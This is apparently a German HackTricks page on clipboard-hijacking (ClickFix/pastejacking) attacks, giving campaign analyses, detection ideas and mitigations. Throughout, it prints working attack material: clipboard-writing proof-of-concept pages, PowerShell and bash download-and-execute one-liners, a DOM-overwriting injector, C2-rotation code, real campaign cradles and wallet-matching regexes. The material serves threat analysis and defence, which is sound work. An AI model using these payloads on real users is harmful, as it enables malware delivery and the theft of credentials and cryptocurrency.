# Clipboard-Hijacking-(Pastejacking)-Angriffe

{{#include ../../banners/hacktricks-training.md}}

> „Füge niemals etwas ein, das du nicht selbst kopiert hast.“ – ein alter, aber weiterhin gültiger Ratschlag

## Überblick

Clipboard hijacking – auch als *Pastejacking* bekannt – macht sich die Tatsache zunutze, dass Benutzer regelmäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) platziert programmgesteuert vom Angreifer kontrollierten Text in der System-Zwischenablage. Die Opfer werden normalerweise durch sorgfältig formulierte Social-Engineering-Anweisungen dazu aufgefordert, **Win + R** (Ausführen-Dialog), **Win + X** (Schnellzugriff / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage *einzufügen*, wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten Sicherheitskontrollen für E-Mail- und Webinhalte, die Anhänge, Makros oder die direkte Befehlsausführung überwachen. Der Angriff ist daher bei Phishing-Kampagnen beliebt, die gängige Malware-Familien wie NetSupport RAT, den Latrodectus loader oder Lumma Stealer verbreiten.<sup>[[1]](#references)</sup>

## Ersetzung von Wallet-Adressen

Eine weitere Variante von **Clipboard hijacking** fügt überhaupt keine Befehle ein: Sie wartet, bis das Opfer eine **Kryptowährungs-Wallet-Adresse** kopiert, und ersetzt sie kurz vor dem Einfügen unbemerkt durch eine vom Angreifer kontrollierte Adresse. Dies ist besonders bei langen Wallet-Formaten effektiv, da Benutzer oft nur die ersten und letzten Zeichen überprüfen.<sup>[[8]](#references)</sup>

Typische Merkmale aus der Praxis:
- **Schlanker Loader + verschachteltes Payload**: Die sichtbare App/Exe wirkt wie ein legitimes Trading- oder „Profit“-Tool, während der eigentliche clipper tiefer im Bundle versteckt ist (beispielsweise ein .NET loader, der ein verschachteltes Rust-Payload startet).
- **Regex-gesteuerte Ersetzung**: Die Malware sucht nach Zeichenfolgen wie `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` oder sogar allgemeinen **44 Zeichen langen Solana-ähnlichen** Zeichenfolgen und ersetzt sie durch Wallets des Angreifers.
- **Wallet-Rotation in großem Maßstab**: Moderne Windows-Samples können pro Währung **Tausende** Ersatz-Wallets enthalten anstatt einer einzigen statischen Adresse, wodurch der Reputationsverlust einer Wallet nach jedem Diebstahl reduziert wird.<sup>[[8]](#references)</sup>

### Ablauf eines Windows-clippers

Eine häufige Implementierung ist ein verstecktes Fenster, das mit **`AddClipboardFormatListener`** registriert wird. Bei jeder Aktualisierung der Zwischenablage ruft die Malware typischerweise Folgendes auf:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → Zugriff auf die aktuellen Daten der Zwischenablage.
- **`GetClipboardData`** → Lesen des Textes.
- **`EmptyClipboard`** + **`SetClipboardData`** → Ersetzen der Wallet-Zeichenfolge durch den Wert des Angreifers.

Minimale, häufig in clippern anzutreffende Such-Regex:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistenz auf Benutzerebene reicht für die Auswirkungen. Ein beobachtetes Muster ist:<sup>[[8]](#references)</sup>
- Payload nach **`%APPDATA%\silke\silke.exe`** kopieren
- Eine **Startup-folder LNK** unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` erstellen

Erkennungsideen:
- Prozesse, die kontinuierlich Clipboard-APIs aufrufen und gleichzeitig unter `%APPDATA%` sowie im **Startup**-Ordner des Benutzers schreiben.
- Erstellung neuer LNKs/ausführbarer Dateien, gefolgt von Clipboard-Umschreibungen von Wallet-Adressen.
- Archive oder Fake-Software-Bundles, die viele ungenutzte Dateien sowie einen kleinen Launcher enthalten, der eine verschachtelte Binary startet.

### Social Engineering zur Quarantäne-Entfernung auf macOS + LaunchAgent-Persistenz

Auf macOS liefern einige Kampagnen einen **`unlocker.command`**-Helfer aus und weisen das Opfer an, mit der rechten Maustaste → **Open** auszuwählen, wenn Gatekeeper meldet, dass die App beschädigt sei oder von einem unbekannten Entwickler stamme. Das Script entfernt einfach die Quarantäne und startet die nahegelegene `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Dies ist **kein Gatekeeper-Exploit**, sondern ein **social-engineered Quarantine-Bypass**, der die Tatsache ausnutzt, dass Gatekeeper-Entscheidungen vom `com.apple.quarantine`-xattr abhängen.<sup>[[8]](#references)</sup>

Nach der Ausführung kann der Clipper als aktueller Benutzer persistieren, indem er Folgendes schreibt:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – Wrapper-Skript
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent mit `RunAtLoad` und `KeepAlive`

Ein nützliches defensives Detail ist, dass manche Samples einen **self-healing Watchdog** implementieren, der den LaunchAgent und den Wrapper etwa alle 30 Sekunden neu schreibt. Wenn du zuerst die plist entfernst, **ohne den laufenden Prozess zu beenden**, kann die Malware sie sofort wiederherstellen.<sup>[[8]](#references)</sup> Sichere Reihenfolge zur Bereinigung:
1. Den aktiven Clipper-Prozess beenden.
2. Die LaunchAgent-plist entladen/löschen.
3. `~/launch.sh` und die kopierte Payload löschen.

### Hinweis zur Verbreitung: gefälschte Reputation als Kraftmultiplikator

Bei dieser Familie kann die Malware selbst technisch simpel bleiben, während die **Verbreitungsschicht** die Hauptarbeit übernimmt: Gefälschte GitHub-Sterne/-Forks, SourceForge-Bewertungen/-Downloads, YouTube-Tutorial-Kommentare/-Aufrufe und harmlos wirkende VirusTotal-Kommentare/-Abstimmungen werden genutzt, damit die Binary vor der Ausführung vertrauenswürdig erscheint.<sup>[[8]](#references)</sup>

## Erzwungene Copy-Buttons und versteckte Payloads (macOS-One-Liner)

Einige macOS-Infostealer klonen Installer-Websites (z. B. Homebrew) und **erzwingen die Verwendung eines „Copy“-Buttons**, sodass Benutzer nur den sichtbaren Text nicht markieren können. Der Clipboard-Eintrag enthält den erwarteten Installer-Befehl sowie eine angehängte Base64-Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziges Einfügen beides ausführt, während die UI die zusätzliche Stufe verbirgt.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Der ClickFix-/ClearFake-Ablauf

1. Der Nutzer besucht eine typosquattete oder kompromittierte Website (z. B. `docusign.sa[.]com`)
2. Eingeschleustes **ClearFake**-JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der unbemerkt einen Base64-kodierten PowerShell-One-Liner in der Zwischenablage speichert.
3. HTML-Anweisungen fordern das Opfer auf: *„Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.“*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine schädliche DLL enthält (klassisches DLL-Sideloading).
5. Der Loader entschlüsselt zusätzliche Stages, injiziert Shellcode und richtet Persistenz ein (z. B. eine geplante Aufgabe) – und führt letztendlich NetSupport RAT / Latrodectus / Lumma Stealer aus.<sup>[[1]](#references)</sup>

### Beispiel einer NetSupport-RAT-Kette
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit einem Rolling-XOR-Schlüssel `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript downloader in **cscript.exe** aus
3. Ruft einen MSI payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verstecktes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mithilfe von `extrac32` und der Dateiverkettung rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldedaten an `sumeriavgv.digital` exfiltriert.<sup>[[1]](#references)</sup>

## ClickFix: Zwischenablage → PowerShell → JS eval → Startup-LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und weisen Opfer stattdessen an, eine Einzeile einzufügen, die JavaScript über WSH abruft und ausführt, es persistent macht und das C2 täglich rotiert. Beispiel einer beobachteten Kette:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Wesentliche Merkmale
- Zur Laufzeit umgekehrte URL, um eine oberflächliche Prüfung zu umgehen.
- JavaScript persistiert sich über eine Startup-LNK (WScript/CScript) und wählt den C2 anhand des aktuellen Tages aus – dadurch wird eine schnelle Domain-Rotation ermöglicht.<sup>[[3]](#references)</sup>

Minimales JS-Fragment zur Rotation der C2s nach Datum:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Phase setzt häufig einen Loader ein, der Persistenz etabliert und einen RAT (z. B. PureHVNC) nachlädt, wobei TLS oft an ein fest codiertes Zertifikat gebunden und der Datenverkehr in Chunks aufgeteilt wird.<sup>[[3]](#references)</sup>

Erkennungsideen speziell für diese Variante
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Startup-Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, die WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry/RunMRU- und Command-line-Telemetrie mit `.split('').reverse().join('')` oder `eval(a.responseText)`.
- Wiederholtes `powershell -NoProfile -NonInteractive -Command -` mit großen stdin-Payloads, um lange Scripts ohne lange Command Lines einzuschleusen.
- Scheduled Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einer wie ein Updater wirkenden Task bzw. einem solchen Pfad ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat Hunting
- Täglich wechselnde C2-Hostnames und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Clipboard-Schreibereignisse korrelieren, auf die ein Einfügen per Win+R und unmittelbar danach die Ausführung von `powershell.exe` folgt.

Blue-Teams können Clipboard-, Process-creation- und Registry-Telemetrie kombinieren, um Pastejacking-Missbrauch zu erkennen:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` speichert den Verlauf der **Win + R**-Befehle – achten Sie auf ungewöhnliche Base64- bzw. obfuskierte Einträge.
* Security Event ID **4688** (Process Creation), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } liegt.
* Event ID **4663** für Dateierstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder in temporären Ordnern unmittelbar vor dem verdächtigen 4688-Ereignis.
* EDR-Clipboard-Sensoren (falls vorhanden) – korrelieren Sie `Clipboard Write`, auf die unmittelbar ein neuer PowerShell-Prozess folgt.

## IUAM-style verification pages (ClickFix Generator): Clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen produzieren massenhaft gefälschte CDN-/Browser-Verifizierungsseiten („Just a moment…“, IUAM-style), die Benutzer dazu bringen, betriebssystemspezifische Befehle aus ihrer Zwischenablage in native Konsolen einzufügen. Dadurch wird die Ausführung aus der Browser-Sandbox heraus verlagert, und der Ansatz funktioniert unter Windows und macOS.<sup>[[4]](#references)</sup>

Wesentliche Merkmale der builder-generated Seiten
- OS-Erkennung über `navigator.userAgent`, um die Payloads anzupassen (Windows PowerShell/CMD gegenüber macOS Terminal). Optionale Decoys/No-ops für nicht unterstützte Betriebssysteme bewahren die Illusion.
- Automatisches Kopieren in die Zwischenablage bei harmlosen UI-Aktionen (Checkbox/Copy), während sich der sichtbare Text vom Inhalt der Zwischenablage unterscheiden kann.
- Blockierung mobiler Geräte und ein Popover mit Schritt-für-Schritt-Anweisungen: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optionale Obfuscation und ein Single-file-Injector zum Überschreiben des DOM einer kompromittierten Site mit einer Tailwind-styled Verifizierungsoberfläche (keine neue Domain-Registrierung erforderlich).<sup>[[4]](#references)</sup>

Beispiel: Clipboard-Mismatch + OS-aware Branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-Persistenz der ersten Ausführung
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und weniger sichtbare Spuren hinterlässt.<sup>[[4]](#references)</sup>

Übernahme von Seiten auf kompromittierten Websites in situ
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennungs- und Hunting-Ideen speziell für IUAM-ähnliche Köder
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichungen zwischen dem angezeigten Text und dem Clipboard-Inhalt; Verzweigungen anhand von `navigator.userAgent`; Tailwind + Single-Page-Ersetzung in verdächtigen Kontexten.
- Windows-Endpunkt: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; Batch-/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS-Endpunkt: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` in zeitlicher Nähe zu Browser-Ereignissen; Hintergrundaufgaben, die das Schließen des Terminals überleben.
- `RunMRU`-Win+R-Verlauf und Clipboard-Schreibvorgänge mit der anschließenden Erstellung von Konsolenprozessen korrelieren.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Seiten und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) verkettet und sogar Blockchain-„etherhiding“-Aufrufe verwendet (z. B. POSTs an Binance Smart Chain API-Endpunkte wie `bsc-testnet.drpc[.]org`), um die aktuelle Köderlogik abzurufen. Neuere Overlays verwenden intensiv fake CAPTCHAs, die Benutzer anweisen, einen One-Liner zu kopieren/einzufügen (T1204.004), anstatt etwas herunterzuladen.<sup>[[6]](#references)</sup>
- Die initiale Ausführung wird zunehmend an signierte Script-Hosts/LOLBAS delegiert. In Ketten von Januar 2026 wurde die frühere Verwendung von `mshta` durch den integrierten `SyncAppvPublishingServer.vbs` ersetzt, der über `WScript.exe` ausgeführt wird und PowerShell-ähnliche Argumente mit Aliases/Wildcards übergibt, um Remote-Inhalte abzurufen:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; in Kombination mit `WScript.exe` und ungewöhnlichen Argumenten (`gal`-/`gcm`-Aliase, mit Wildcards versehene Cmdlets, jsDelivr-URLs) wird es zu einer klar erkennbaren LOLBAS-Stage für ClearFake.<sup>[[6]](#references)</sup>
- Gefälschte CAPTCHA-Payloads wechselten im Februar 2026 wieder zu reinen PowerShell-Download-Cradles. Zwei aktive Beispiele:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die erste Chain ist ein In-Memory-`iex(irm ...)`-Grabber; die zweite nutzt `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1`-Datei und startet sie anschließend mit `-ep bypass` in einem verborgenen Fenster.<sup>[[6]](#references)</sup>

Erkennungs-/Hunting-Tipps für diese Varianten
- Prozessabstammung: Browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell-Cradles unmittelbar nach Clipboard-Schreibvorgängen bzw. Win+R.
- Command-Line-Schlüsselwörter: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr-/GitHub-/Cloudflare-Worker-Domains oder rohe IP-`iex(irm ...)`-Muster.
- Netzwerk: Ausgehende Verbindungen zu CDN-Worker-Hosts oder Blockchain-RPC-Endpunkten von Script-Hosts/PowerShell kurz nach dem Browsen.
- Datei/Registry: Erstellung temporärer `.ps1`-Dateien unter `%TEMP%` sowie RunMRU-Einträge mit diesen One-Linern; signierte Script-LOLBAS (WScript/cscript/mshta) blockieren bzw. alarmieren, wenn sie mit externen URLs oder obfuskierten Alias-Strings ausgeführt werden.

## ClickFix-Taktiken im Juni 2026: Paste-Telemetrie, gefälschte Verifizierungskommentare und LOLBin-Chaining

Aktuelle Red-Canary-Telemetrie zeigt, dass der stabile Indikator **nicht ein einzelner exakter Befehl**, sondern die Kombination aus **benutzerunterstütztem Paste-and-Run**, **vertrauenswürdigen Interpretern/LOLBins**, **obfuskierten Flags**, **Remote-Abruf** und **sofortiger Ausführung** ist.<sup>[[7]](#references)</sup>

### Bemerkenswerte Operator-Muster

- **Paste-Bestätigungstelemetrie**: Einige Payloads rufen vor der eigentlichen Stage `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` auf. Dadurch wird die Benutzerinteraktion bestätigt, während das Fenster kurz und unauffällig bleibt.
- **Gefälschte Verifizierungskommentare**: PowerShell-One-Liner können Strings wie `# Security check ✔️ I'm not a robot Verification ID: 138105` anhängen, sodass der Befehl nach dem Einfügen in Run / `cmd.exe` / die PowerShell-History weiterhin wie ein CAPTCHA-bezogener Befehl aussieht.
- **Dynamische URL-Rekonstruktion**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermeidet eine statische URL in der Command Line und führt dennoch Download-and-Execute im Speicher aus.
- **Verschleierte Installer-Ausführung**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` missbraucht ungewöhnliche Groß-/Kleinschreibung und Unicode-ähnliche Zeichen in Flags, um fragile Erkennungen zu umgehen, während der Befehl weiterhin wie `msiexec.exe` aussieht.
- **Caret-escapete LOLBin-Chains**: `cmd.exe` kann Schlüsselwörter mit `^`-Escapes verbergen (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die verschachtelte Shell minimiert starten, Angreiferinhalte mit einer harmlos wirkenden Erweiterung wie `.pdf` speichern und sie anschließend über `mshta` ausführen.<sup>[[7]](#references)</sup>
## Gegenmaßnahmen

1. Browser-Härtung – Clipboard-Schreibzugriff deaktivieren (`dom.events.asyncClipboard.clipboardItem` usw.) oder eine Benutzeraktion voraussetzen.
2. Security Awareness – Benutzer anweisen, sensible Befehle zu *tippen* oder sie zunächst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control verwenden, um beliebige One-Liner zu blockieren.
4. Netzwerkkontrollen – ausgehende Anfragen an bekannte Pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** missbraucht häufig denselben ClickFix-Ansatz, nachdem Benutzer in einen schädlichen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Click beheben: Verhindern des ClickFix-Angriffsvektors](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Unter dem reinen Vorhang: Vom RAT zum Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Die ClickFix-Fabrik: Erste Veröffentlichung des IUAM-ClickFix-Generators](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Von Sternen zu Upvotes: Gefälschte Reputation als Treibstoff für einen Crypto-Clipboard-Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
